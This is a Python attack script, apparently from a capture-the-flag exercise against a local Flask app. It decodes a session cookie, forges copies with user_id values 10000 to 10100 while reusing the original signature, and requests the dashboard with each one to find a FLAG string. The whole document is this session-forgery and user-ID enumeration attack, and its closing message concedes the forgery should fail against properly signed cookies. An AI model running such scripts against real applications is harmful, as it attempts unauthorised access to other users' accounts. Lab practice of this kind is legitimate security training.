import base64
import json
import requests
import re
from urllib.parse import quote, unquote

# Configuration
BASE_URL = "http://127.0.0.1:33187"
DASHBOARD_ENDPOINT = "/dashboard"
LOGIN_ENDPOINT = "/login"

# Known valid session cookie from context
VALID_SESSION = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.aVd0oA.VqPUgS4MLdLZbrF9JRNetU8FfwI"

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Security Research Script)'
}

def extract_payload_from_cookie(cookie_value):
    """Extract and decode the payload portion of a Flask session cookie"""
    try:
        parts = cookie_value.split('.')
        if len(parts) >= 1:
            # The first part is the base64 encoded payload
            payload_b64 = parts[0]
            # Add padding if needed
            missing_padding = len(payload_b64) % 4
            if missing_padding:
                payload_b64 += '=' * (4 - missing_padding)
            
            payload_json = base64.b64decode(payload_b64).decode('utf-8')
            payload = json.loads(payload_json)
            return payload
    except Exception as e:
        print(f"[!] Error decoding cookie payload: {e}")
        return None

def create_modified_cookie(original_cookie, new_user_id):
    """Attempt to create a modified session cookie with new user_id"""
    try:
        parts = original_cookie.split('.')
        if len(parts) < 3:
            print(f"[!] Invalid cookie format: {original_cookie}")
            return None
        
        # Create new payload
        new_payload = {"user_id": str(new_user_id)}
        payload_json = json.dumps(new_payload, separators=(',', ':'))
        
        # Encode new payload
        new_payload_b64 = base64.b64encode(payload_json.encode('utf-8')).decode('utf-8')
        
        # Try to keep timestamp and signature from original (this likely won't work due to signature mismatch)
        # But we'll try it anyway in case of weak validation
        new_cookie = f"{new_payload_b64}.{parts[1]}.{parts[2]}"
        return new_cookie
    except Exception as e:
        print(f"[!] Error creating modified cookie: {e}")
        return None

# First, let's analyze the structure of the valid cookie
print("=" * 60)
print("SESSION COOKIE ANALYSIS")
print("=" * 60)
print(f"Original session cookie: {VALID_SESSION}")

decoded_payload = extract_payload_from_cookie(VALID_SESSION)
if decoded_payload:
    print(f"Decoded payload: {decoded_payload}")
else:
    print("[!] Could not decode original cookie payload")

print()

# Test the current valid cookie first
print("=" * 60)
print("TESTING CURRENT VALID SESSION")
print("=" * 60)
print(f"Testing with original cookie (user_id: {decoded_payload.get('user_id') if decoded_payload else 'unknown'})")

try:
    session_cookies = {'session': VALID_SESSION}
    response = requests.get(
        f"{BASE_URL}{DASHBOARD_ENDPOINT}",
        headers=headers,
        cookies=session_cookies,
        timeout=10
    )
    
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    print(f"Response Preview (first 500 chars):\n{response.text[:500]}")
    
    # Check for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0)}")
        print()
        exit()
    else:
        print("[-] No FLAG found in response")
        
except requests.exceptions.RequestException as e:
    print(f"[!] Error accessing dashboard: {e}")

print()
print("=" * 60)
print("STARTING USER_ID BRUTE FORCE")
print("=" * 60)
print("Testing user_id values 10000-10100")
print()

# Results tracking
results = []
found_flag = None
error_count = 0
success_count = 0

# Iterate through user_id values
for user_id in range(10000, 10101):  # 10000 to 10100 inclusive
    try:
        # Create modified session cookie
        modified_cookie = create_modified_cookie(VALID_SESSION, user_id)
        
        if not modified_cookie:
            print(f"[!] Failed to create cookie for user_id {user_id}")
            error_count += 1
            continue
        
        # Send request with modified cookie
        session_cookies = {'session': modified_cookie}
        response = requests.get(
            f"{BASE_URL}{DASHBOARD_ENDPOINT}",
            headers=headers,
            cookies=session_cookies,
            timeout=10
        )
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            found_flag = flag_match.group(0)
            print(f"[!] FLAG FOUND at user_id {user_id}: {found_flag}")
            print(f"[!] Full response:\n{response.text}")
            success_count += 1
            results.append({
                'user_id': user_id,
                'status': response.status_code,
                'has_flag': True,
                'flag': found_flag,
                'response_length': len(response.text)
            })
            break
        
        # Record interesting responses (not 404 or 403)
        if response.status_code not in [404, 403]:
            success_count += 1
            results.append({
                'user_id': user_id,
                'status': response.status_code,
                'has_flag': False,
                'response_length': len(response.text)
            })
        
        # Print progress every 10 requests
        if (user_id - 10000 + 1) % 10 == 0:
            print(f"[*] Progress: Tested {user_id - 10000 + 1}/101 IDs...")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error for user_id {user_id}: {e}")
        error_count += 1
    except Exception as e:
        print(f"[!] Unexpected error for user_id {user_id}: {e}")
        error_count += 1

# Print final summary
print()
print("=" * 60)
print("BRUTE FORCE COMPLETE")
print("=" * 60)

if found_flag:
    print(f"[SUCCESS] FLAG DISCOVERED: {found_flag}")
else:
    print("[-] No FLAG found during brute force")
    print(f"Total successful requests: {success_count}")
    print(f"Total errors: {error_count}")
    print()
    print("Interesting responses (non-404/403):")
    for result in results[:10]:  # Show first 10 to avoid spam
        print(f"  user_id {result['user_id']}: Status {result['status']}, Length {result['response_length']}B")
    
    if len(results) > 10:
        print(f"  ... and {len(results) - 10} more")

print()
print("Note: Flask session cookies are cryptographically signed. The approach above")
print("attempted to reuse the signature from the original cookie, but this should")
print("fail in properly configured applications. If no FLAG was found, the session")
print("cookies may be properly validated.")
